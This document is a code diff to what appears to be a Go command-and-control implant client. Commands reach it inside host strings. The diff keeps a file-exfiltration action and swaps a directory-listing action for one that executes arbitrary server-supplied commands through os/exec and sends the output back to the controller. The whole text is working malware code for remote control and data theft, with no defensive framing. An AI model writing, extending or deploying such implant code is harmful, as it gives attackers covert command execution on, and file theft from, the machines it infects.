@@ -9,13 +9,14 @@ import (
 	"math/rand"
 	"net"
 	"os"
+	"os/exec"
 	"strings"
 	"time"
 )
 
 func resolveCommand(host []string, bl *int) {
 	// Change the mappings here to customize what triggers will be responsible for different operations. Ex: "cmd": "mail"
-	trigger_mappings := map[string]string{"cmd": "cmd", "exf": "exf", "ls": "ls", "single": "single", "path": "path"}
+	trigger_mappings := map[string]string{"cmd": "cmd", "exf": "exf", "bash": "bash", "single": "single", "path": "path"}
 
 	// If the host contains the string "cmd", we know that the server is sending the client a command to execute.
 	if strings.Contains(host[0], trigger_mappings["cmd"]) {
@@ -33,46 +34,39 @@ func resolveCommand(host []string, bl *int) {
 		// Action type (exfil, ls, etc.)
 		action_type := strings.Split(sections[1], "-")[0]
 
-		// Destination type (filename or filepath; "single" or "path")
-		dest_type := strings.Split(sections[1], "-")[1]
-
-		// var filepath string = ""
-		filepath := fmt.Sprintf("%v.%v", sections[2], sections[3])
-		if trigger_mappings[dest_type] == "path" {
-			filepath_sections := strings.Split(sections[2], "-")
-			filepath = strings.Join(filepath_sections, "/")
-			filepath = fmt.Sprintf("/%v.%v", filepath, sections[3])
-		}
-
 		switch action_type {
 
 		// Download command has been received
 		case trigger_mappings["exf"]:
-			fmt.Printf("Downloading: %v\n", filepath)
+			// Destination type (filename or filepath; "single" or "path")
+			dest_type := strings.Split(sections[1], "-")[1]
+
+			// var filepath string = ""
+			filepath := fmt.Sprintf("%v.%v", sections[2], sections[3])
+			if trigger_mappings[dest_type] == "path" {
+				filepath_sections := strings.Split(sections[2], "-")
+				filepath = strings.Join(filepath_sections, "/")
+				filepath = fmt.Sprintf("/%v.%v", filepath, sections[3])
+			}
+
 			// Perform the usual exfil operation as you would otherwise
 			dat := setup_exfil(filepath)
 			var mode string = "exfil"
 			begin_comm(&dat, bl, &mode)
 
 		// List directory command has been received
-		case trigger_mappings["ls"]:
-			var output_bytes []byte
+		case trigger_mappings["bash"]:
+			// https://www.sohamkamani.com/golang/exec-shell-command/
 			var mode string = "c2"
-			files, _ := os.ReadDir(".")
-			for i := 0; i < len(files); i++ {
-				// Format the output with tabs, and the name of each file.
-				output_bytes := []byte("\t* " + files[i].Name())
-
-				// Append "bls" ('begin ls') to the front of the list so that the server knows how to decode the output
-				output_bytes = append([]byte("bls"), output_bytes...)
-
-				// Add a newline to reduce formatting efforts on the server side
-				output_bytes = append(output_bytes[:], []byte("\n")...)
-				begin_comm(&output_bytes, bl, &mode)
+			bash_command := sections[2]
+			cmd := exec.Command(string(bash_command))
+			out, err := cmd.Output()
+			if err != nil {
+				fmt.Println(err)
 			}
-
-			// Send "els" ('end ls') to tell the server that the operation has ended.
-			output_bytes = []byte("els")
+			output_bytes := append([]byte("beg"), out...)
+			begin_comm(&output_bytes, bl, &mode)
+			output_bytes = []byte("fin")
 			begin_comm(&output_bytes, bl, &mode)
 		}
 	}
